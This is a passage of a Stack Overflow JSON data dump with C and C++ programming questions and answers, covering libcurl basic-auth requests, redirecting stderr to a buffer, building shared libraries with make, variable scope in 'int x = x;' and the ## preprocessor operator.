I can do it like this: </p>\n\n<pre><code>curl --user user:password \"http://sub.domain.com/rest/getdiscounts?supermarketid=5323\"\n</code></pre>\n\n<p>I have tried multiple things so far, such as : </p>\n\n<pre><code>static string lastResponse;\n\nsize_t server_response_stream(void *ptr, size_t size, size_t nmemb, void *)\n{\n  lastResponse += (const char*)ptr;\n  return size * nmemb;\n}\n\nbool get_request(string data1, string&amp; errorDescription)\n{\n  CURL *curl = curl_easy_init();\n  if (curl == NULL)\n  {\n    errorDescription = \"Unable to initialise Curl\";\n    cout &lt;&lt; errorDescription &lt;&lt; std::endl;\n    return false;\n  }\n  const string url = \"http://sub.domain.com/rest/\";\n  curl_easy_setopt(curl, CURLOPT_URL, (url + \"getdiscounts\").c_str());\n  curl_easy_setopt(curl, CURLOPT_HTTPAUTH, CURLAUTH_BASIC);\n  curl_easy_setopt(curl, CURLOPT_USERPWD, USPA);\n\n  char* dc1 = curl_easy_escape(curl, data1.c_str(), 0);\n  string arg = \"supermarketid=\" + (string)dc1;\n  const char* dt = arg.c_str();\n\n  curl_easy_setopt(curl, CURLOPT_POSTFIELDS, dt);\n  curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, (long)strlen(dt));\n\n  curl_easy_setopt(curl, CURLOPT_VERBOSE, 1L);\n\n  lastResponse = \"\";\n  curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, server_response_stream);\n\n  CURLcode res = curl_easy_perform(curl);\n\n  res = curl_easy_perform(curl);\n\n  if (res != CURLE_OK)\n  {\n    errorDescription = \"Curl call to server failed!\";\n    cout &lt;&lt; errorDescription &lt;&lt; std::endl;\n    return false;\n  }\n\n  curl_easy_cleanup(curl);\n  return true;\n}\n</code></pre>\n\n<p>I used as sources <a href=\"https://stackoverflow.com/questions/5707957/c-libcurl-json-rest\">this question</a> and <a href=\"http://biarri.com/using-libcurl-to-make-web-requests-from-a-c-program/\" rel=\"nofollow noreferrer\">this link</a>. </p>\n\n<p>EDIT: Thanks for the help! I started from scratch again and it is working now:</p>\n\n<pre><code>static string responseStr;\nsize_t write_callback(void *ptr, size_t size, size_t nmemb, void *)\n{\n  responseStr = (const char*)ptr;\n  return size * nmemb;\n}\n\nstring get_request()\n{\n  CURL *curl;\n  CURLcode res;\n\n  curl = curl_easy_init();\n  if (curl)\n  {\n    curl_easy_setopt(curl, CURLOPT_URL, \"http://sub.domain.com/rest/getdiscounts?supermarketid=5323\");\n    curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);\n    curl_easy_setopt(curl, CURLOPT_HTTPAUTH, CURLAUTH_BASIC);\n    curl_easy_setopt(curl, CURLOPT_USERPWD, CREDENTIALS);\n    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);\n\n    res = curl_easy_perform(curl);\n\n    if (res != CURLE_OK)\n    {\n      cout &lt;&lt; \"curl_easy_perform() failed!\" &lt;&lt; std::endl;\n      curl_easy_strerror(res);\n      curl_easy_cleanup(curl);\n      return \"\";\n    }\n\n    else if (res == CURLE_OK)\n    {\n      curl_easy_cleanup(curl);\n      return responseStr;\n    }\n  }\n}\n</code></pre>\n"}, {"tags": ["c", "posix", "stderr"], "comments": [{"owner": {"reputation": 27420, "user_id": 4756299, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e38adc5559df095cfe10c664916e8ffa?s=128&d=identicon&r=PG&f=1", "display_name": "Andrew Henle", "link": "https://stackoverflow.com/users/4756299/andrew-henle"}, "edited": false, "score": 0, "creation_date": 1459331794, "post_id": 36304597, "comment_id": 60234489, "body": "Given <code>char *buf;</code> what what do you think <code>sizeof( buf );</code> is?"}], "answers": [{"comments": [{"owner": {"reputation": 1657, "user_id": 812032, "user_type": "registered", "accept_rate": 64, "profile_image": "https://www.gravatar.com/avatar/cd59937927787b5a008cf99af6147663?s=128&d=identicon&r=PG", "display_name": "bhavs", "link": "https://stackoverflow.com/users/812032/bhavs"}, "edited": false, "score": 0, "creation_date": 1459331013, "post_id": 36304994, "comment_id": 60233902, "body": "I considered the approach of writing the output to a temp file(read from the temp file and then into the buffer) instead of redirecting it to a buffer. It would be a slight overload and I would like to avoid doing it. This is shirt hand version of a larger problem and there may be many instances of the system call being made."}, {"owner": {"reputation": 1791, "user_id": 5022759, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Hg0HA.png?s=128&g=1", "display_name": "ikrabbe", "link": "https://stackoverflow.com/users/5022759/ikrabbe"}, "reply_to_user": {"reputation": 1657, "user_id": 812032, "user_type": "registered", "accept_rate": 64, "profile_image": "https://www.gravatar.com/avatar/cd59937927787b5a008cf99af6147663?s=128&d=identicon&r=PG", "display_name": "bhavs", "link": "https://stackoverflow.com/users/812032/bhavs"}, "edited": false, "score": 1, "creation_date": 1459331150, "post_id": 36304994, "comment_id": 60233999, "body": "@bhavs you cannot avoid this, as when you redirect the STDERR file number correctly, all calls to <code>fprintf(&quot;stderr&quot;</code> will go to your mem buffer anyway, but when you redefine stderr nothing happens for <code>write(2</code> calls."}, {"owner": {"reputation": 76134, "user_id": 417501, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/703f62ead2e305b1dff62066065a0554?s=128&d=identicon&r=PG", "display_name": "fuz", "link": "https://stackoverflow.com/users/417501/fuz"}, "reply_to_user": {"reputation": 1791, "user_id": 5022759, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Hg0HA.png?s=128&g=1", "display_name": "ikrabbe", "link": "https://stackoverflow.com/users/5022759/ikrabbe"}, "edited": false, "score": 0, "creation_date": 1459331204, "post_id": 36304994, "comment_id": 60234044, "body": "@ikrabbe Yes, but in the child, only the file descriptor is preserved. <code>fmemopen()</code> does not create a file descriptor, so any approach that relies on <code>fmemopen()</code> is doomed from the beginning."}, {"owner": {"reputation": 76134, "user_id": 417501, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/703f62ead2e305b1dff62066065a0554?s=128&d=identicon&r=PG", "display_name": "fuz", "link": "https://stackoverflow.com/users/417501/fuz"}, "reply_to_user": {"reputation": 1657, "user_id": 812032, "user_type": "registered", "accept_rate": 64, "profile_image": "https://www.gravatar.com/avatar/cd59937927787b5a008cf99af6147663?s=128&d=identicon&r=PG", "display_name": "bhavs", "link": "https://stackoverflow.com/users/812032/bhavs"}, "edited": false, "score": 2, "creation_date": 1459331357, "post_id": 36304994, "comment_id": 60234162, "body": "@bhavs Since the parent and child are different processes there is no way around going through the operating system. The overhead is not that large. If you are afraid of the file growing large, use approach two (pipe). With a pipe, the data never hits the disk. With approach one, it is only very likely that the data never hits the disk (provided you use <code>mkstemp()</code> to create it)."}, {"owner": {"reputation": 1791, "user_id": 5022759, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Hg0HA.png?s=128&g=1", "display_name": "ikrabbe", "link": "https://stackoverflow.com/users/5022759/ikrabbe"}, "edited": false, "score": 0, "creation_date": 1459331368, "post_id": 36304994, "comment_id": 60234168, "body": "that&#39;s what I meant: You cannot use this simple solution, you have to go a more complex way."}, {"owner": {"reputation": 1657, "user_id": 812032, "user_type": "registered", "accept_rate": 64, "profile_image": "https://www.gravatar.com/avatar/cd59937927787b5a008cf99af6147663?s=128&d=identicon&r=PG", "display_name": "bhavs", "link": "https://stackoverflow.com/users/812032/bhavs"}, "edited": false, "score": 0, "creation_date": 1459331509, "post_id": 36304994, "comment_id": 60234257, "body": "Can I update this question with the other piece of code that I have written to open a temp file and write stderr data to this ? I had not thought about fork() a child process though when I wrote this code. Will you be able to provide comments for the same ? Would that be a part of the same question or will I have to raise another question at SO ?"}, {"owner": {"reputation": 76134, "user_id": 417501, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/703f62ead2e305b1dff62066065a0554?s=128&d=identicon&r=PG", "display_name": "fuz", "link": "https://stackoverflow.com/users/417501/fuz"}, "reply_to_user": {"reputation": 1657, "user_id": 812032, "user_type": "registered", "accept_rate": 64, "profile_image": "https://www.gravatar.com/avatar/cd59937927787b5a008cf99af6147663?s=128&d=identicon&r=PG", "display_name": "bhavs", "link": "https://stackoverflow.com/users/812032/bhavs"}, "edited": false, "score": 0, "creation_date": 1459331656, "post_id": 36304994, "comment_id": 60234375, "body": "@bhavs Go for it, but if the question becomes sufficiently different, better ask a new one."}, {"owner": {"reputation": 76134, "user_id": 417501, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/703f62ead2e305b1dff62066065a0554?s=128&d=identicon&r=PG", "display_name": "fuz", "link": "https://stackoverflow.com/users/417501/fuz"}, "reply_to_user": {"reputation": 1657, "user_id": 812032, "user_type": "registered", "accept_rate": 64, "profile_image": "https://www.gravatar.com/avatar/cd59937927787b5a008cf99af6147663?s=128&d=identicon&r=PG", "display_name": "bhavs", "link": "https://stackoverflow.com/users/812032/bhavs"}, "edited": false, "score": 0, "creation_date": 1459332703, "post_id": 36304994, "comment_id": 60235184, "body": "@bhavs You can use the file based approach (approach 1) with the additional requirements as well, no problem."}], "tags": [], "owner": {"reputation": 76134, "user_id": 417501, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/703f62ead2e305b1dff62066065a0554?s=128&d=identicon&r=PG", "display_name": "fuz", "link": "https://stackoverflow.com/users/417501/fuz"}, "is_accepted": false, "score": 1, "last_activity_date": 1459330800, "creation_date": 1459330800, "answer_id": 36304994, "question_id": 36304597, "link": "https://stackoverflow.com/questions/36304597/redirect-stderr-to-a-buffer-in-c/36304994#36304994", "title": "redirect stderr to a buffer in c", "body": "<p>The <code>fmemopen()</code> function does not actually open a file descriptor, thus <code>fileno()</code> on a <code>FILE</code> obtained from <code>fmemopen()</code> returns an undefined value. <code>fmemopen()</code> is implemented by writing directly to the buffer without ever sending the data through the operating system. It is not possible to preserve the file opened with <code>fmemopen()</code> through a <code>fork()</code>.</p>\n\n<p>Another problem is that you never allocate memory for your buffer, read about the <code>fmemopen()</code> API and how to use it to understand the problem.</p>\n\n<p>Here are two approaches that work:</p>\n\n<ul>\n<li>open a temporary file, then <code>fork()</code>. In the forked process, dupe its file descriptor over file descriptor 2 (<code>STDERR_FILENO</code>) and then execute your command. In the parent, <code>wait()</code> for the child, then read what it wrote to the temporary file. Note that you need to do an <code>lseek()</code> before reading as the child will change the file pointer.</li>\n<li>open a fifo with <code>pipe()</code>, then <code>fork()</code>. In the child, dupe the writing end over file descriptor 2, close the reading end and then execute your command. In the parent, close the writing end and read what the child wrote from the reading end while its running. Don't forget to <code>wait()</code> for the child afterwards.</li>\n</ul>\n"}], "owner": {"reputation": 1657, "user_id": 812032, "user_type": "registered", "accept_rate": 64, "profile_image": "https://www.gravatar.com/avatar/cd59937927787b5a008cf99af6147663?s=128&d=identicon&r=PG", "display_name": "bhavs", "link": "https://stackoverflow.com/users/812032/bhavs"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 708, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1459331910, "creation_date": 1459329718, "last_edit_date": 1459331910, "question_id": 36304597, "link": "https://stackoverflow.com/questions/36304597/redirect-stderr-to-a-buffer-in-c", "title": "redirect stderr to a buffer in c", "body": "<p>I have looked at the previous questions that have been asked. And I have come up with this code to obtain the current value of stderr, re-direct that to a buf and reassign stderr. This is code. </p>\n\n<p>\nThe redirect of the stderr to the buff is not happening. I can see this on the screen when I try to execute the code :</p>\n\n<pre><code>     ls: cannot access system: No such file or directory\n     hellow world\n     error from buffer\n</code></pre>\n\n<p>The source code looks like this :</p>\n\n<pre><code>#include&lt;stdio.h&gt;\nstatic int fd;\nstatic fpos_t pos;\nchar *buf;\n\nvoid closeerr()\n{\n    fflush(stderr);\n    fgetpos(stderr, &amp;pos);\n    fd = dup(fileno(stderr));\n    buf =(char *)calloc(sizeof(char *),1024);\n    stderr = fmemopen(buf, sizeof(buf), \"w\");\n}\n\nvoid reverterr()\n{\n    fflush(stderr);\n    dup2(fd, fileno(stderr));\n    close(fd);\n    clearerr(stderr);\n    fsetpos(stderr, &amp;pos);\n}\n\nvoid main()\n{\n    closeerr();\n    printf(\"hellow world\");\n    system(\" ls -l system\"); // this is where I see the error msg\n    printf(\"error from buffer %s\",buf);\n    reverterr();\n}\n</code></pre>\n\n<p>This code re-directs stdout(the logic would be the same to re-direct stderr) to a temp file ( Approach 1 as suggested below though I have not forked and created a child process to write into the file ) </p>\n\n<pre><code>void switchStdout(const char *newStream)\n{\n  fflush(stdout);\n  fgetpos(stdout, &amp;pos);\n  fd = dup(fileno(stdout));\n  freopen(newStream, \"w\", stdout);\n</code></pre>\n\n<p>}</p>\n\n<pre><code>void revertStdout()\n {\n  fflush(stdout);\n  dup2(fd, fileno(stdout));\n  close(fd);\n  clearerr(stdout);\n  fsetpos(stdout, &amp;pos);\n }\n\nvoid main(){\n  switchStdout(\"/tmp/err.txt\");\n  printf(\"Hello world\");\n  revertStdout();\n}\n</code></pre>\n"}, {"tags": ["c++", "c", "linux", "gcc", "makefile"], "comments": [{"owner": {"reputation": 152528, "user_id": 981959, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/04798ba8ef6591a9c23c5868dc0bf664?s=128&d=identicon&r=PG", "display_name": "Jonathan Wakely", "link": "https://stackoverflow.com/users/981959/jonathan-wakely"}, "edited": false, "score": 3, "creation_date": 1459331135, "post_id": 36304586, "comment_id": 60233983, "body": "The problem is not your makefile. You need to tell the dynamic linker how to find the library at run time, using either RPATH or LD_LIBRARY_PATH. This has been asked and answered thousands of times on stackoverflow and elsewhere. Search for &quot;error while loading shared libraries&quot;"}], "answers": [{"comments": [{"owner": {"reputation": 1798, "user_id": 4438921, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/kYGzp.jpg?s=128&g=1", "display_name": "linrongbin", "link": "https://stackoverflow.com/users/4438921/linrongbin"}, "edited": false, "score": 0, "creation_date": 1459332183, "post_id": 36305142, "comment_id": 60234775, "body": "Thanks for your patience, I can see your makefile is much better than mine, thanks a lot for your sharing."}, {"owner": {"reputation": 19253, "user_id": 657267, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/1dcf516021abb964aecd6ae2386fd59d?s=128&d=identicon&r=PG", "display_name": "user657267", "link": "https://stackoverflow.com/users/657267/user657267"}, "reply_to_user": {"reputation": 1798, "user_id": 4438921, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/kYGzp.jpg?s=128&g=1", "display_name": "linrongbin", "link": "https://stackoverflow.com/users/4438921/linrongbin"}, "edited": false, "score": 1, "creation_date": 1459332943, "post_id": 36305142, "comment_id": 60235350, "body": "@zhaochenyou I only realized your question wasn&#39;t actually related to the makefile after reading Jonathan&#39;s comment, still I&#39;m glad you find the answer useful."}, {"owner": {"reputation": 1798, "user_id": 4438921, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/kYGzp.jpg?s=128&g=1", "display_name": "linrongbin", "link": "https://stackoverflow.com/users/4438921/linrongbin"}, "edited": false, "score": 0, "creation_date": 1459333176, "post_id": 36305142, "comment_id": 60235521, "body": "Yes, it&#39;s actually useful, my makefile is too much raw, yours is professional."}], "tags": [], "owner": {"reputation": 19253, "user_id": 657267, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/1dcf516021abb964aecd6ae2386fd59d?s=128&d=identicon&r=PG", "display_name": "user657267", "link": "https://stackoverflow.com/users/657267/user657267"}, "is_accepted": true, "score": 3, "last_activity_date": 1459331417, "last_edit_date": 1459331417, "creation_date": 1459331178, "answer_id": 36305142, "question_id": 36304586, "link": "https://stackoverflow.com/questions/36304586/how-to-create-and-use-a-self-defined-shared-library-with-gcc/36305142#36305142", "title": "how to create and use a self-defined shared library with gcc?", "body": "<p>Make has built in rules for much of what you need, the following should work with the caveat that you'll need to remake the <code>.o</code> files when switching between shared and non-shared</p>\n\n<pre><code>CXXFLAGS := -std=c++11 -Wall -g -pthread\nLDFLAGS  := -g -pthread\n\nbasic.exe static.exe shared.exe: exampleMain.o\nbasic.exe:  example.o\nstatic.exe: libstatic.a\nshared.exe: libshared.so\n\nlibstatic.a: libstatic.a(example.o)\n\nlibshared.so: CXXFLAGS += -fPIC\nlibshared.so: LDFLAGS += -shared -Wl,-soname,libshared.so\nlibshared.so: example.o\n\nbasic.exe static.exe shared.exe libshared.so:\n    $(CXX) $(LDFLAGS) $^ $(LDLIBS) -o $@\n\nclean: ; $(RM) exmapleMain.o example.o libshared.so libstatic.a basic.exe static.exe shared.exe\n</code></pre>\n\n<p>Important note: <strong>never</strong> use wildcards when deleting, you might delete something you aren't responsible for.</p>\n\n<p>As for the error read <a href=\"http://tldp.org/HOWTO/Program-Library-HOWTO/shared-libraries.html\" rel=\"nofollow\">this</a>, particularly the \"Installing and Using a Shared Library\" section.</p>\n"}, {"tags": [], "owner": {"reputation": 1798, "user_id": 4438921, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/kYGzp.jpg?s=128&g=1", "display_name": "linrongbin", "link": "https://stackoverflow.com/users/4438921/linrongbin"}, "is_accepted": false, "score": 0, "last_activity_date": 1459335932, "creation_date": 1459335932, "answer_id": 36306968, "question_id": 36304586, "link": "https://stackoverflow.com/questions/36304586/how-to-create-and-use-a-self-defined-shared-library-with-gcc/36306968#36306968", "title": "how to create and use a self-defined shared library with gcc?", "body": "<p>With help of @user657267, I write an example makefile, it supports these:</p>\n\n<ul>\n<li>make basic.exe</li>\n<li>make libstatic.a</li>\n<li>make static.exe</li>\n<li>make libshared.so</li>\n<li>make shared.exe</li>\n</ul>\n\n<p>The source cpp file is example.hpp, example.cpp, exampleMain.cpp. There're a simple example function, and a main function.\nHere's the mainfile:</p>\n\n<pre><code># additional compile flags\n# CFLAGS for c\n# CXXFLAGS for c++\nCXXFLAGS := -std=c++11 -Wall -g -pthread -I./\n\n# additional link flags\nLDFLAGS  := -pthread\n\n# dependent object\nbasic.exe static.exe shared.exe: exampleMain.o\nbasic.exe:  example.o\nstatic.exe: libstatic.a\nshared.exe: libshared.so\n\n# additional link flags for shared.exe\n# NOTICE: -Wl,-rpath=./ is for libshared.so runtime path\nshared.exe: LDFLAGS += -L./ -Wl,-rpath=./\n\n# NOTICE: this command also works:\n# libstatic.a: libstatic.a(example.o)\nlibstatic.a: example.o\n    ar rcs libstatic.a example.o\n\n# additional compile and link flags for libshared.so\nlibshared.so: CXXFLAGS += -fPIC\nlibshared.so: LDFLAGS += -shared -Wl,-soname,libshared.so\n# dependent object\nlibshared.so: example.o\n\n# $^: all dependent objects\n# $@: all target objects\n# $(CXX): default c++ compiler\n# $(LDLIBS): default c++ libraries\nbasic.exe static.exe shared.exe libshared.so:\n    $(CXX) $(CXXFLAGS) $(LDFLAGS) $^ $(LDLIBS) -o $@\n\n# $(RM): default rm command\nclean:\n    $(RM) exmapleMain.o example.o libshared.so libstatic.a basic.exe static.exe shared.exe\n</code></pre>\n"}], "owner": {"reputation": 1798, "user_id": 4438921, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/kYGzp.jpg?s=128&g=1", "display_name": "linrongbin", "link": "https://stackoverflow.com/users/4438921/linrongbin"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 461, "favorite_count": 0, "accepted_answer_id": 36305142, "answer_count": 2, "score": 2, "last_activity_date": 1459335932, "creation_date": 1459329683, "last_edit_date": 1459330552, "question_id": 36304586, "link": "https://stackoverflow.com/questions/36304586/how-to-create-and-use-a-self-defined-shared-library-with-gcc", "title": "how to create and use a self-defined shared library with gcc?", "body": "<p>I'm trying to write a simple example shared library makefile, but I met some bugs and cannot handle it, please help me, thanks.</p>\n\n<p>This is my makefile:</p>\n\n<pre><code>exampleMain.o: exampleMain.cpp\ng++ -std=c++11 -I./ -Wall -g -c exampleMain.cpp\n\n\n# (1) Basic\n\nexample.o: example.cpp\n    g++ -std=c++11 -I./ -Wall -g -c example.cpp\n\nbasic: example.o exampleMain.o\n    g++ -std=c++11 -Wall -g -pthread example.o exampleMain.o -o basic.exe\n\n\n# (2) Static Library\n\nstatic.o: example.cpp\n    g++ -std=c++11 -I./ -Wall -g -c example.cpp -o static.o\n\nlibstatic.a: static.o\n    ar rcs libstatic.a static.o\n\nstatic: libstatic.a exampleMain.o\n    g++ exampleMain.o libstatic.a -pthread -o static.exe\n\n\n# (3) Simple Shared Library\n\nshared.o: example.cpp\n    g++ -std=c++11 -I./ -Wall -g -fPIC -c example.cpp -o shared.o\n\nlibshared.so: shared.o\n    g++ -shared -Wl,-soname,libshared.so -o libshared.so shared.o\n\nshared: libshared.so exampleMain.o\n    g++ exampleMain.o -o shared.exe -L./ -lshared -pthread\n\n\n# (4) Clean\n\nclean:\n    rm *.o *.so *.a *.exe *.so.*\n</code></pre>\n\n<p>This makefile support 4 operation: </p>\n\n<ul>\n<li>(1) make basic: basic.exe</li>\n<li>(2) make static: static.exe</li>\n<li>(3) make shared: shared.exe</li>\n<li>(4) make clean: rm objects</li>\n</ul>\n\n<p>(3) can be make, but when I try \"./shared.exe\", it says: ./shared.exe: error while loading shared libraries: libshared.so: cannot open shared object file: No such file or directory</p>\n\n<p>Here's my example code and makefile link: <a href=\"https://github.com/zhaochenyou/Tips/tree/master/tool_chain/make/basic\" rel=\"nofollow\">https://github.com/zhaochenyou/Tips/tree/master/tool_chain/make/basic</a></p>\n"}, {"tags": ["c++", "c", "scope", "initialization", "declaration"], "comments": [{"owner": {"reputation": 426981, "user_id": 596781, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/a18405dd4b022837867d1f5453a05f41?s=128&d=identicon&r=PG", "display_name": "Kerrek SB", "link": "https://stackoverflow.com/users/596781/kerrek-sb"}, "edited": false, "score": 2, "creation_date": 1459329608, "post_id": 36304511, "comment_id": 60232813, "body": "The <code>x</code> in scope is <code>x</code>, not <code>x</code>. (Possibly <a href=\"http://stackoverflow.com/q/14935722\">related question</a>.)"}, {"owner": {"reputation": 165665, "user_id": 721269, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/346ca03edfbde2a468adc289867ab975?s=128&d=identicon&r=PG", "display_name": "David Schwartz", "link": "https://stackoverflow.com/users/721269/david-schwartz"}, "edited": false, "score": 0, "creation_date": 1459329682, "post_id": 36304511, "comment_id": 60232868, "body": "Take away the <code>int x = 5;</code> line and nothing changes in the code. That <code>x</code> is never accessed."}], "answers": [{"tags": [], "owner": {"reputation": 4751, "user_id": 5649326, "user_type": "registered", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/a82Se.jpg?s=128&g=1", "display_name": "Marievi", "link": "https://stackoverflow.com/users/5649326/marievi"}, "is_accepted": false, "score": 0, "last_activity_date": 1459329629, "creation_date": 1459329629, "answer_id": 36304566, "question_id": 36304511, "link": "https://stackoverflow.com/questions/36304511/why-am-i-getting-garbage-value-for-the-c-program/36304566#36304566", "title": "Why am I getting garbage value for the C program?", "body": "<p>The declaration <code>int x = 5;</code> is out of the scope of your second block. This means that variable <code>x</code> in the following piece of code</p>\n\n<pre><code>{\n    int x = x;\n    printf(\"%d\", x);\n}\n</code></pre>\n\n<p>is different from the outside variable <code>x</code>, declared in main. So when you try to access its value in the assignment, it gives a garbage value as it did not exist in this scope before and therefore <strong><em>it is not initialized</em></strong>.</p>\n"}, {"tags": [], "owner": {"reputation": 219634, "user_id": 2877241, "user_type": "registered", "accept_rate": 52, "profile_image": "https://www.gravatar.com/avatar/63d17ecdadc8917254be4fb70e86246b?s=128&d=identicon&r=PG&f=1", "display_name": "Vlad from Moscow", "link": "https://stackoverflow.com/users/2877241/vlad-from-moscow"}, "is_accepted": true, "score": 4, "last_activity_date": 1459331927, "last_edit_date": 1459331927, "creation_date": 1459329669, "answer_id": 36304579, "question_id": 36304511, "link": "https://stackoverflow.com/questions/36304511/why-am-i-getting-garbage-value-for-the-c-program/36304579#36304579", "title": "Why am I getting garbage value for the C program?", "body": "<p>In this declaration</p>\n\n<pre><code>int x = x;\n</code></pre>\n\n<p>the point of declaration of the identifier <code>x</code> is after the complete definition of the declarator that is <code>x</code> is already visible before the assignment sign <code>=</code> and hides the variable with the same name declared in the outer block scope..</p>\n\n<p>And you have that <code>x</code> that is not initialized is assigned to itself. As result it has an indeterminate value.</p>\n\n<p>You can imagine it the following way</p>\n\n<pre><code>int x;\nx = x;\n</code></pre>\n\n<p>Exactly the same example exists in the C++ Standard (3.3.2 Point of declaration)</p>\n\n<blockquote>\n  <p>1 The point of declaration for a name is immediately after its\n  complete declarator (Clause 8) and before its initializer (if any),\n  except as noted below. [ Example:</p>\n</blockquote>\n\n<pre><code>int x = 12;\n{ int x = x; }\n</code></pre>\n\n<blockquote>\n  <p>Here the second x is initialized with its own (indeterminate) value.\n  \u2014end example ]</p>\n</blockquote>\n\n<p>In the C Standard there is written (6.2.1 Scopes of identifiers)</p>\n\n<blockquote>\n  <p>7 Structure, union, and enumeration tags have scope that begins just\n  after the appearance of the tag in a type specifier that declares the\n  tag. Each enumeration constant has scope that begins just after the\n  appearance of its defining enumerator in an enumerator list. <strong>Any\n  other identifier has scope that begins just after the completion of\n  its declarator.</strong></p>\n</blockquote>\n\n<p>Pay attention to the definition of enumerators. The rule for enumerators is different.</p>\n\n<p>This program is well-formed and the enumerator <code>x</code> will be initialized by the variable <code>x</code> declared in the outer scope (while the enumerator <code>y</code> will be initialized by the preceding enumerator <code>x</code>).</p>\n\n<pre><code>#include &lt;iostream&gt;\n\nint main()\n{\n    const int x = 10;\n    {\n        enum E { x = x + 1, y = x };\n        std::cout &lt;&lt; \"E::x = \" &lt;&lt; x &lt;&lt; \", E::y = \" &lt;&lt; y &lt;&lt; std::endl;\n    }\n    std::cout &lt;&lt; \"x = \" &lt;&lt; x &lt;&lt; std::endl;\n}    \n</code></pre>\n\n<p>The program output is</p>\n\n<pre><code>E::x = 11, E::y = 11\nx = 10\n</code></pre>\n"}], "owner": {"reputation": 4335, "user_id": 997704, "user_type": "registered", "accept_rate": 36, "profile_image": "https://www.gravatar.com/avatar/2f14d93702d3a39060e4202e9b510369?s=128&d=identicon&r=PG", "display_name": "username_4567", "link": "https://stackoverflow.com/users/997704/username-4567"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 909, "favorite_count": 0, "closed_date": 1459329793, "accepted_answer_id": 36304579, "answer_count": 2, "score": -2, "last_activity_date": 1459331927, "creation_date": 1459329496, "last_edit_date": 1459330288, "question_id": 36304511, "link": "https://stackoverflow.com/questions/36304511/why-am-i-getting-garbage-value-for-the-c-program", "closed_reason": "Duplicate", "title": "Why am I getting garbage value for the C program?", "body": "<p>Why do I get garbage value if I compile the following C code with GCC/Clang?\nNote, if I just print the value of x in inner scope I get expected result.</p>\n\n<pre><code>#include&lt;stdio.h&gt;\nint main()\n{\n    int x = 5;\n    {\n        int x = x;\n        printf(\"%d\", x);\n    }\n    return 0;\n}\n</code></pre>\n"}, {"tags": ["c", "gcc", "c-preprocessor"], "comments": [{"owner": {"reputation": 5296, "user_id": 418066, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/38yuw.png?s=128&g=1", "display_name": "Biffen", "link": "https://stackoverflow.com/users/418066/biffen"}, "edited": false, "score": 1, "creation_date": 1459329666, "post_id": 36304415, "comment_id": 60232857, "body": "<code>#define</code> creates a preprocessor macro (look that up if you don&#39;t know what it is). In this case the macro is called <code>newdef</code> and it takes two parameters; <code>a</code> and <code>b</code>. <code>newdef(input,5)</code> gets expanded into the macro definition (<code>char a ## [\u2026]</code>) with every occurrence of <code>a</code> expanded into <code>input</code> and every <code>b</code> expanded into <code>5</code>. <code>##</code> is a concatenation operator, so <code>a ## sumthing</code> turns into <code>inputsumthing</code> (in this case)."}, {"owner": {"reputation": 488, "user_id": 5811284, "user_type": "registered", "accept_rate": 59, "profile_image": "https://www.gravatar.com/avatar/6ba5aaacb39e60b76187811a6007e215?s=128&d=identicon&r=PG&f=1", "display_name": "Raph Schim", "link": "https://stackoverflow.com/users/5811284/raph-schim"}, "edited": false, "score": 0, "creation_date": 1459329783, "post_id": 36304415, "comment_id": 60232945, "body": "## Is just the preprocessor concatenation operator, if it&#39;s your question :)"}], "answers": [{"tags": [], "owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "is_accepted": false, "score": 5, "last_activity_date": 1459329729, "creation_date": 1459329729, "answer_id": 36304603, "question_id": 36304415, "link": "https://stackoverflow.com/questions/36304415/using-operator/36304603#36304603", "title": "Using ## operator", "body": "<p>Its a preprocessor concatenation operator, and can only be used when defining preprocessor macros.</p>\n\n<p>Lets take a simple example</p>\n\n<pre><code>#define CONCAT(a, b) a ## b\n\nint CONCAT(foo, bar);\n</code></pre>\n\n<p>In the above code, the invocation of <code>CONCAT(foo, bar)</code> will be replaced by </p>\n\n<pre><code>int foobar;\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 54864, "user_id": 404970, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/o6X94.jpg?s=128&g=1", "display_name": "molbdnilo", "link": "https://stackoverflow.com/users/404970/molbdnilo"}, "is_accepted": true, "score": 3, "last_activity_date": 1459330441, "creation_date": 1459330441, "answer_id": 36304856, "question_id": 36304415, "link": "https://stackoverflow.com/questions/36304415/using-operator/36304856#36304856", "title": "Using ## operator", "body": "<p><code>input</code> is neither a string nor a variable, it's a preprocessing token.</p>\n\n<p><code>##</code> is the \"token-pasting\" operator.</p>\n\n<p>The first macro 